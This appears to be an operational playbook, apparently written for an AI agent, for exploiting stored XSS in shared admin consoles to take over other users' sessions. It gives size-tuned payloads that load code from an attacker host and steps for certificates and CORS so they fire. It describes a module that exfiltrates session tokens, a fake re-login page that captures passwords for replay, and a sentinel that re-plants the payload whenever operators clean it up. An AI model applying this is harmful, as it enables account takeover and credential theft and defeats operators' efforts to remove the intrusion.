# Shared-store stored XSS: low-priv account → admin / other-tenant browser

Use when an unenforced write lands in a table that an admin console or other tenants render. The write itself ("write without auth") is the entry, not the payload; the finding is code execution in another identity's authenticated browser → session → the platform's own control endpoints.

## 1. Find the injection point: test verbs, not namespaces

- Take the **lowest-privilege valid token** you hold and fire every verb of the candidate module: `list / get / add / addTemplate / update / delete / save / import / export`. Auth hangs on the handler, not the prefix — a `401` / `scode:2` on `/mod/list` says nothing about `/mod/add`.
- The endpoints a customer's own pages call are usually different from the login page's set. **Fetch every authenticated page you can reach**, not just the main bundle: pull the customer menu's HTML pages with your token and grep the endpoint names out of them. Reading only the login bundle leaves whole write surfaces unseen (a `server + "/x/y"` string in one template page is how the write verb gets found).
- Writing through is necessary-but-not-sufficient: `scode:0` / `200` must be confirmed by reading your own row back through a low-privilege read endpoint.

## 2. Verify the render sink in code

In the page fetched with your token, find the row renderer:

```javascript
createdRow: function(row, data){
  var currentHtml = "";
  currentHtml += fmtTableLine(data.name);   // field spliced in
  ...
  $(row).html(currentHtml);                 // parsed as HTML
}
```

Read three things:

1. **How it is joined** — if `fmtTableLine(d)` is a `template.replace("#slot", d)` / `.html()` / `innerHTML` splice, it is raw.
2. **What the sanitizer actually blocks** — `hasIllegalChar`-style functions that only reject a literal substring (e.g. `script`) are bypassable.
3. **The field's length cap** — read it off the server's own error (`模板名称不能超过50`, `参数超长`); it decides how large a payload you can ship.
4. **Look for the second sink your write creates for free.** An add/update usually also writes an **operation/audit-log row** whose `content` field is the very name you supplied, and the console's op-log page renders `content` through the same `fmtTableLine(...) → .html()` path. One write then has two firing surfaces (module list page + op-log page) — map "write verb → audit log" as a sink of its own.

## 3. Size the payload: shortest primitive that dodges the blacklist

- Literal-blacklist ⇒ **swap the execution primitive** so the banned substring never appears: `<img src=x onerror=…>`, `<svg onload=…>`, `<iframe srcdoc=…>`.
- Count characters when the cap is tight. Example, ≤49 chars and free of `script`:
  `<img src=x onerror=location='//<your-ip>'>` = 47 chars
- Build the payload **in a Python string only**, never through a local shell — this machine's own `$(...)` expansion fabricates a fake success and is the documented false positive.
- If the cap is too tight for one-shot exfiltration, check a **sibling field with no cap** (content body / remark / batch payload) — but confirm which context renders it first.
- **A tight cap does NOT mean "navigate only".** Ship a **two-stage loader** and serve the real code yourself:
  `<svg onload=import('//<host>/a')>` — 41 chars with a short host, `import()` works in a classic script context and pulls a real ES module. `<img src=x onerror=import('//<host>/a')>` dodges a blacklist containing `svg` but **costs 9 more characters** (`<svg onload=` is 11, `<img src=x onerror=` is 20), so with a hostname-length callback only the `svg onload` form fits a 50-char cap.
- **Match the delivery scheme to the console or the payload is a dud: on an HTTPS console `//<host>/a` and `import('//<host>/a')` resolve to `https://`.** A listener on plain HTTP then fails the TLS handshake *silently* — indistinguishable from "the payload never fired". Get a real certificate instead of downgrading the URL: `acme.sh --issue --alpn -d <your-ip>.sslip.io` (free hostname that resolves to your IP; 80/443 must be free; register **with no contact email** — ACME/Let's Encrypt reject `.invalid` domains and `example.com`). Serve `/a` on 443 and use that hostname in **both** the payload and the exfil URL — a bare IP against a hostname-scoped cert fails verification and kills the callback just as silently. Then verify for real: a strict-verifying TLS fetch of the module, plus a headless/Node dry-run of the module logic against the live API.
  - Serve `/a` from your listener as **`Content-Type: application/javascript` + `Access-Control-Allow-Origin: *`**. A cross-origin module import is CORS-checked, so a missing header fails **silently** — it looks exactly like "the payload never fired". Verify with `curl -i` before shipping.
  - The module runs same-origin, so it can read `sessionStorage.token` / `document.cookie` plainly and exfiltrate with the value in the query string, landing the session token in your access log (no landing-page phishing round needed).
  - Measure before shipping: `len(payload) <= cap`. Over by one character the whole request is rejected by business validation (a `402 缺少参数`-shaped error) — it is **not** silently truncated.
- **Read the target page's `Content-Security-Policy` header before choosing the payload form.** No CSP (common on these consoles) ⇒ external module imports and `fetch` are fine. A restrictive CSP forces the inline-`onerror` + same-origin-only form instead. One `curl -I` decides the payload; do not skip it.

## 4. Trigger and collect

- **Listener on a publicly reachable port**, with a log and a plausible landing page. A short payload can usually only `location=`-navigate (cross-origin, so it cannot read the victim's `localStorage`); make the landing page a "session expired, please re-login" credential-capture page — Chinese back-office logins submit the password **RSA PKCS1v15**-encrypted, so captured plaintext can be replayed by you with the public key you already pulled from `crypto-util-*.js`.
- **The callback may take hours** (it needs a human to open the list page). Run the watcher as a background process writing to a file; do not declare the chain dead on a quiet hour, keep working other surfaces meanwhile.

## 5. Discipline

- **A shared table often already contains another authorised test team's marker** (`name = "<img src=x onerror=alert(1)>"`). Treat it as corroboration that the chain is reachable: record it, do not delete or alter it, and do not report it as the target's own traffic.
- **Cleanup:** read back and store the created row's ID at write time; delete by ID when done (probe the delete endpoint's ownership check with an ID that is not yours first — do not actually delete another tenant's row).
- **Re-arm watch (armed trap against an operator who cleans up).** After planting, run a periodic sentinel that: (1) re-logs-in itself for a **fresh** token — single-session platforms invalidate the previous one, never reuse it; (2) reads the list endpoint and greps for **your own listener IP / payload signature** to tell whether the row survived; (3) **re-injects only when it is gone** — a row that still exists must not be re-added, because repeated writes into the operator's production table are noise and exposure; (4) keeps a byte cursor over the callback log so each run reports only new hits, dumps hits to a separate file, and prints a one-line status. Log the re-injection count so the user can see how often the operator is cleaning up.
- Reporting bar: XSS reaching an admin/other-tenant browser counts as a takeover-class finding; a payload that only fires in your own account does not.
